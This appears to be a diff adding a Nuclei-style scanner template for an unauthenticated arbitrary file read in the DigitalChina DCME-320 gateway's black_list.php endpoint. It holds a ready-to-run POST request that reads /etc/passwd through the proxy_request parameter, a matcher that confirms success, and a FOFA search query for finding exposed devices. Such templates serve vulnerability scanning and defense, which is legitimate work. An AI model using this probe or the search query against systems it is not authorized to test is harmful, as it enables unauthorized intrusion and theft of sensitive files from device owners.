@@ -1,0 +1,37 @@
+id: dcn-dcme-320-black_list-fileread
+info:
+  name: 神州数码 DCME-320出口网关 black_list.php 任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: 神州数码 DCME-320出口网关 black_list.php 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件(如数据库配置文件、系统配置文件)、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference: 
+    - https://mp.weixin.qq.com/s?__biz=MzE5MTM2MjA0NQ==&mid=2247483663&idx=1&sn=450b8f726588cad9d2658fd90c31304c&chksm=9606e79da1716e8b73cf47d9a4c960fc004d0272caaca6aae8ac475379778245ed906291165b&cur_album_id=4045056277938913283&scene=189#wechat_redirect
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="style/blue/css/dcn_ui.css"
+    tips:
+    repair:
+    version:
+  tags: dcn,fileread
+
+http:
+  - raw:
+      - |
+        POST /function/auth/user/black_list.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        proxy_request=/etc/passwd
+        
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
